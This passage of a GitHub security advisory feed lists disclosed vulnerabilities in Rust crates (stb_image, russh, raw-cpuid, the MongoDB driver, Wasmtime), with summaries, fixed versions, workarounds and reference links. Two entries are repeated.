        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fcmm-54jp-7vf6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-21T22:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stb_image] NULL pointer derefernce in `stb_image`]]></title>
        <id>https://github.com/advisories/GHSA-ppjr-267j-5p9x</id>
        <link href="https://github.com/advisories/GHSA-ppjr-267j-5p9x"/>
        <updated>2023-03-20T21:12:09.000Z</updated>
        <content type="html"><![CDATA[<p>A bug in error handling in the <code>stb_image</code> C library could cause a NULL pointer dereference when attempting to load an invalid or unsupported image file.  This is fixed in version 0.2.5 and later of the <code>stb_image</code> Rust crate, by patching the C code to correctly handle NULL pointers.</p>
<p>Thank you to GitHub user 0xdd96 for finding and fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/servo/rust-stb-image/pull/102">https://github.com/servo/rust-stb-image/pull/102</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0021.html">https://rustsec.org/advisories/RUSTSEC-2023-0021.html</a></li>
<li><a href="https://github.com/advisories/GHSA-ppjr-267j-5p9x">https://github.com/advisories/GHSA-ppjr-267j-5p9x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ppjr-267j-5p9x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-20T21:11:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] russh may use insecure Diffie-Hellman keys]]></title>
        <id>https://github.com/advisories/GHSA-cqvm-j2r2-hwpg</id>
        <link href="https://github.com/advisories/GHSA-cqvm-j2r2-hwpg"/>
        <updated>2023-03-23T22:30:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Diffie-Hellman key validation is insufficient, which can lead to insecure shared secrets and therefore breaks confidentiality.</p>
<h3 id="details">Details</h3>
<p>Russh does not validate Diffie-Hellman keys.</p>
<p>It accepts received DH public keys $e$ where $e&lt;0$, $e=1$, or $e \geq p-1$ from a misbehaving peer annd successfully performs key exchange.</p>
<p>This is a violation of <a href="https://www.rfc-editor.org/rfc/rfc4253#section-8">RFC 4253, section 8</a> and <a href="https://www.rfc-editor.org/rfc/rfc8268#section-4">RFC 8268, section 4</a>, which state that:</p>
<blockquote>
<p>DH Public Key values MUST be checked and both conditions:</p>
<ul>
<li>$1 &lt; e &lt; p-1$</li>
<li>$1 &lt; f &lt; p-1$</li>
</ul>
<p>MUST be true.  Values not within these bounds MUST NOT be sent or
accepted by either side.  If either one of these conditions is
violated, then the key exchange fails.</p>
</blockquote>
<p>For example, a DH client public key $e=1$ would mean that the shared secret that the server calculates is always $K = e^y \mod{p} = 1^y \mod{p} = 1$.
In other cases, an insecure order-2 subgroup may be used.</p>
<p>Also, the code does not look like it ensures that the generated secret key $y$ is in the valid interval $0 &lt; y &lt; q$ (or, if russh is the client, that the secret key $x$ satisfies $1 &lt; x &lt; q$):
<a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76</a>
For example, <code>rng.gen_biguint()</code> might return a number consisting of zeroes, so that $y = 0$.</p>
<p>The public key is not validated either:
<a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81</a></p>
<h3 id="impact">Impact</h3>
<p>Due to the issues in the DH key generation, I think any connection that uses Diffie-Hellman key exchange is affected.
Connections between a russh client and server or those of a russh peer with some other misbehaving peer are most likely to be problematic. These may vulnerable to eavesdropping.</p>
<p>Most other implementations reject such keys, so this is mainly an interoperability issue in such a case.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/warp-tech/russh/security/advisories/GHSA-cqvm-j2r2-hwpg">https://github.com/warp-tech/russh/security/advisories/GHSA-cqvm-j2r2-hwpg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28113">https://nvd.nist.gov/vuln/detail/CVE-2023-28113</a></li>
<li><a href="https://github.com/warp-tech/russh/commit/45d2d82930bf4a675bd57abfafec8fe4065befcd">https://github.com/warp-tech/russh/commit/45d2d82930bf4a675bd57abfafec8fe4065befcd</a></li>
<li><a href="https://github.com/warp-tech/russh/commit/d831a3716d3719dc76f091fcea9d94bd4ef97c6e">https://github.com/warp-tech/russh/commit/d831a3716d3719dc76f091fcea9d94bd4ef97c6e</a></li>
<li><a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76</a></li>
<li><a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81</a></li>
<li><a href="https://github.com/warp-tech/russh/releases/tag/v0.36.2">https://github.com/warp-tech/russh/releases/tag/v0.36.2</a></li>
<li><a href="https://github.com/warp-tech/russh/releases/tag/v0.37.1">https://github.com/warp-tech/russh/releases/tag/v0.37.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cqvm-j2r2-hwpg">https://github.com/advisories/GHSA-cqvm-j2r2-hwpg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqvm-j2r2-hwpg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-17T14:42:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] russh may use insecure Diffie-Hellman keys]]></title>
        <id>https://github.com/advisories/GHSA-cqvm-j2r2-hwpg</id>
        <link href="https://github.com/advisories/GHSA-cqvm-j2r2-hwpg"/>
        <updated>2023-03-23T22:30:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Diffie-Hellman key validation is insufficient, which can lead to insecure shared secrets and therefore breaks confidentiality.</p>
<h3 id="details">Details</h3>
<p>Russh does not validate Diffie-Hellman keys.</p>
<p>It accepts received DH public keys $e$ where $e&lt;0$, $e=1$, or $e \geq p-1$ from a misbehaving peer annd successfully performs key exchange.</p>
<p>This is a violation of <a href="https://www.rfc-editor.org/rfc/rfc4253#section-8">RFC 4253, section 8</a> and <a href="https://www.rfc-editor.org/rfc/rfc8268#section-4">RFC 8268, section 4</a>, which state that:</p>
<blockquote>
<p>DH Public Key values MUST be checked and both conditions:</p>
<ul>
<li>$1 &lt; e &lt; p-1$</li>
<li>$1 &lt; f &lt; p-1$</li>
</ul>
<p>MUST be true.  Values not within these bounds MUST NOT be sent or
accepted by either side.  If either one of these conditions is
violated, then the key exchange fails.</p>
</blockquote>
<p>For example, a DH client public key $e=1$ would mean that the shared secret that the server calculates is always $K = e^y \mod{p} = 1^y \mod{p} = 1$.
In other cases, an insecure order-2 subgroup may be used.</p>
<p>Also, the code does not look like it ensures that the generated secret key $y$ is in the valid interval $0 &lt; y &lt; q$ (or, if russh is the client, that the secret key $x$ satisfies $1 &lt; x &lt; q$):
<a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76</a>
For example, <code>rng.gen_biguint()</code> might return a number consisting of zeroes, so that $y = 0$.</p>
<p>The public key is not validated either:
<a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81</a></p>
<h3 id="impact">Impact</h3>
<p>Due to the issues in the DH key generation, I think any connection that uses Diffie-Hellman key exchange is affected.
Connections between a russh client and server or those of a russh peer with some other misbehaving peer are most likely to be problematic. These may vulnerable to eavesdropping.</p>
<p>Most other implementations reject such keys, so this is mainly an interoperability issue in such a case.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/warp-tech/russh/security/advisories/GHSA-cqvm-j2r2-hwpg">https://github.com/warp-tech/russh/security/advisories/GHSA-cqvm-j2r2-hwpg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28113">https://nvd.nist.gov/vuln/detail/CVE-2023-28113</a></li>
<li><a href="https://github.com/warp-tech/russh/commit/45d2d82930bf4a675bd57abfafec8fe4065befcd">https://github.com/warp-tech/russh/commit/45d2d82930bf4a675bd57abfafec8fe4065befcd</a></li>
<li><a href="https://github.com/warp-tech/russh/commit/d831a3716d3719dc76f091fcea9d94bd4ef97c6e">https://github.com/warp-tech/russh/commit/d831a3716d3719dc76f091fcea9d94bd4ef97c6e</a></li>
<li><a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L72-L76</a></li>
<li><a href="https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81">https://github.com/warp-tech/russh/blob/master/russh/src/kex/dh/groups.rs#L78-L81</a></li>
<li><a href="https://github.com/warp-tech/russh/releases/tag/v0.36.2">https://github.com/warp-tech/russh/releases/tag/v0.36.2</a></li>
<li><a href="https://github.com/warp-tech/russh/releases/tag/v0.37.1">https://github.com/warp-tech/russh/releases/tag/v0.37.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cqvm-j2r2-hwpg">https://github.com/advisories/GHSA-cqvm-j2r2-hwpg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqvm-j2r2-hwpg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-17T14:42:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[raw-cpuid] Deserialization of Untrusted Data in rust-cpuid]]></title>
        <id>https://github.com/advisories/GHSA-w428-f65r-h4q2</id>
        <link href="https://github.com/advisories/GHSA-w428-f65r-h4q2"/>
        <updated>2023-03-16T17:39:47.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the raw-cpuid crate before 9.1.1 for Rust. If the serialize feature is used (which is not the the default), a Deserialize operation may lack sufficient validation, leading to memory corruption or a panic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45687">https://nvd.nist.gov/vuln/detail/CVE-2021-45687</a></li>
<li><a href="https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/raw-cpuid/RUSTSEC-2021-0089.md">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/raw-cpuid/RUSTSEC-2021-0089.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2021-0089.html">https://rustsec.org/advisories/RUSTSEC-2021-0089.html</a></li>
<li><a href="https://github.com/advisories/GHSA-w428-f65r-h4q2">https://github.com/advisories/GHSA-w428-f65r-h4q2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w428-f65r-h4q2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-01-06T22:13:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongodb] Exposure of Sensitive Information to an Unauthorized Actor in MongoDB Rust Driver]]></title>
        <id>https://github.com/advisories/GHSA-4rjr-3gj2-5crq</id>
        <link href="https://github.com/advisories/GHSA-4rjr-3gj2-5crq"/>
        <updated>2023-03-16T17:37:54.000Z</updated>
        <content type="html"><![CDATA[<p>Specific MongoDB Rust Driver versions can include credentials used by the connection pool to authenticate connections in the monitoring event that is emitted when the pool is created. The user's logging infrastructure could then potentially ingest these events and unexpectedly leak the credentials. Note that such monitoring is not enabled by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-20332">https://nvd.nist.gov/vuln/detail/CVE-2021-20332</a></li>
<li><a href="https://jira.mongodb.org/browse/RUST-591">https://jira.mongodb.org/browse/RUST-591</a></li>
<li><a href="https://github.com/mongodb/mongo-rust-driver/commit/9e8782b1bb1104e5399c073b553719c262d4463c">https://github.com/mongodb/mongo-rust-driver/commit/9e8782b1bb1104e5399c073b553719c262d4463c</a></li>
<li><a href="https://github.com/advisories/GHSA-4rjr-3gj2-5crq">https://github.com/advisories/GHSA-4rjr-3gj2-5crq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4rjr-3gj2-5crq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:09:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wasmtime] Wasmtime out of bounds read/write with zero-memory-pages configuration]]></title>
        <id>https://github.com/advisories/GHSA-44mr-8vmm-wjhg</id>
        <link href="https://github.com/advisories/GHSA-44mr-8vmm-wjhg"/>
        <updated>2023-03-16T16:18:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a bug in Wasmtime's implementation of its pooling instance allocator when the allocator is configured to give WebAssembly instances a maximum of zero pages of memory. In this configuration the virtual memory mapping for WebAssembly memories did not meet the compiler-required configuration requirements for safely executing WebAssembly modules. Wasmtime's default settings require virtual memory page faults to indicate that wasm reads/writes are out-of-bounds, but the pooling allocator's configuration would not create an appropriate virtual memory mapping for this meaning out of bounds reads/writes can successfully read/write memory unrelated to the wasm sandbox within range of the base address of the memory mapping created by the pooling allocator.</p>
<p>This bug can only be triggered by setting <a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.InstanceLimits.html#structfield.memory_pages"><code>InstanceLimits::memory_pages</code></a> to zero. This is expected to be a very rare configuration since this means that wasm modules cannot allocate any pages of linear memory. All wasm modules produced by all current toolchains are highly likely to use linear memory, so it's expected to be unlikely that this configuration is set to zero by any production embedding of Wasmtime, hence the low severity of this bug despite the critical consequences.</p>
<h3 id="patches">Patches</h3>
<p>This bug has been patched and users should upgrade to Wasmtime 2.0.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>One way to mitigate this issue is to disable usage of the pooling allocator. Note that the pooling allocator is not enabled by default.</p>
<p>This bug can also only be worked around by increasing the <code>memory_pages</code> allotment when configuring the pooling allocator to a value greater than zero. If an embedding wishes to still prevent memory from actually being used then the <code>Store::limiter</code> method can be used to dynamically disallow growth of memory beyond 0 bytes large. Note that the default <code>memory_pages</code> value is greater than zero.</p>
<p>This bug is not applicable with the default settings of the <code>wasmtime</code> crate.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.Config.html#method.allocation_strategy"><code>Config::allocation_strategy</code></a> - configuration required to enable the pooling allocator.</li>
<li><a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.InstanceLimits.html#structfield.memory_pages"><code>InstanceLimits::memory_pages</code></a> - configuration field that, when zero, exhibits this bug.</li>
<li><a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.Store.html#method.limiter"><code>Store::limiter</code></a> - means of limiting memory without using <code>memory_pages</code></li>
<li><a href="https://groups.google.com/a/bytecodealliance.org/g/sec-announce/c/c1HBDDJwNPA">Mailing list announcement</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/e60c3742904ccbb3e26da201c9221c38a4981d72">Patch for the <code>release-2.0.0</code> branch</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-44mr-8vmm-wjhg">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-44mr-8vmm-wjhg</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/e60c3742904ccbb3e26da201c9221c38a4981d72">https://github.com/bytecodealliance/wasmtime/commit/e60c3742904ccbb3e26da201c9221c38a4981d72</a></li>
<li><a href="https://groups.google.com/a/bytecodealliance.org/g/sec-announce/c/c1HBDDJwNPA">https://groups.google.com/a/bytecodealliance.org/g/sec-announce/c/c1HBDDJwNPA</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39392">https://nvd.nist.gov/vuln/detail/CVE-2022-39392</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0076.html">https://rustsec.org/advisories/RUSTSEC-2022-0076.html</a></li>
<li><a href="https://github.com/advisories/GHSA-44mr-8vmm-wjhg">https://github.com/advisories/GHSA-44mr-8vmm-wjhg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-44mr-8vmm-wjhg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-11-10T21:09:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wasmtime] Wasmtime out of bounds read/write with zero-memory-pages configuration]]></title>
        <id>https://github.com/advisories/GHSA-44mr-8vmm-wjhg</id>
        <link href="https://github.com/advisories/GHSA-44mr-8vmm-wjhg"/>
        <updated>2023-03-16T16:18:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a bug in Wasmtime's implementation of its pooling instance allocator when the allocator is configured to give WebAssembly instances a maximum of zero pages of memory. In this configuration the virtual memory mapping for WebAssembly memories did not meet the compiler-required configuration requirements for safely executing WebAssembly modules. Wasmtime's default settings require virtual memory page faults to indicate that wasm reads/writes are out-of-bounds, but the pooling allocator's configuration would not create an appropriate virtual memory mapping for this meaning out of bounds reads/writes can successfully read/write memory unrelated to the wasm sandbox within range of the base address of the memory mapping created by the pooling allocator.</p>
<p>This bug can only be triggered by setting <a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.InstanceLimits.html#structfield.memory_pages"><code>InstanceLimits::memory_pages</code></a> to zero. This is expected to be a very rare configuration since this means that wasm modules cannot allocate any pages of linear memory. All wasm modules produced by all current toolchains are highly likely to use linear memory, so it's expected to be unlikely that this configuration is set to zero by any production embedding of Wasmtime, hence the low severity of this bug despite the critical consequences.</p>
<h3 id="patches">Patches</h3>
<p>This bug has been patched and users should upgrade to Wasmtime 2.0.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>One way to mitigate this issue is to disable usage of the pooling allocator. Note that the pooling allocator is not enabled by default.</p>
<p>This bug can also only be worked around by increasing the <code>memory_pages</code> allotment when configuring the pooling allocator to a value greater than zero. If an embedding wishes to still prevent memory from actually being used then the <code>Store::limiter</code> method can be used to dynamically disallow growth of memory beyond 0 bytes large. Note that the default <code>memory_pages</code> value is greater than zero.</p>
<p>This bug is not applicable with the default settings of the <code>wasmtime</code> crate.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.Config.html#method.allocation_strategy"><code>Config::allocation_strategy</code></a> - configuration required to enable the pooling allocator.</li>
<li><a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.InstanceLimits.html#structfield.memory_pages"><code>InstanceLimits::memory_pages</code></a> - configuration field that, when zero, exhibits this bug.</li>
<li><a href="https://docs.rs/wasmtime/2.0.1/wasmtime/struct.Store.html#method.limiter"><code>Store::limiter</code></a> - means of limiting memory without using <code>memory_pages</code></li>
<li><a href="https://groups.google.com/a/bytecodealliance.org/g/sec-announce/c/c1HBDDJwNPA">Mailing list announcement</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/e60c3742904ccbb3e26da201c9221c38a4981d72">Patch for the <code>release-2.0.0</code> branch</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-44mr-8vmm-wjhg">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-44mr-8vmm-wjhg</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/e60c3742904ccbb3e26da201c9221c38a4981d72">https://github.com/bytecodealliance/wasmtime/commit/e60c3742904ccbb3e26da201c9221c38a4981d72</a></li>
<li><a href="https://groups.google.com/a/bytecodealliance.org/g/sec-announce/c/c1HBDDJwNPA">https://groups.google.com/a/bytecodealliance.org/g/sec-announce/c/c1HBDDJwNPA</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39392">https://nvd.nist.gov/vuln/detail/CVE-2022-39392</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0076.html">https://rustsec.org/advisories/RUSTSEC-2022-0076.html</a></li>
<li><a href="https://github.com/advisories/GHSA-44mr-8vmm-wjhg">https://github.com/advisories/GHSA-44mr-8vmm-wjhg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-44mr-8vmm-wjhg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-11-10T21:09:02.000Z</published>
    </entry>
</feed>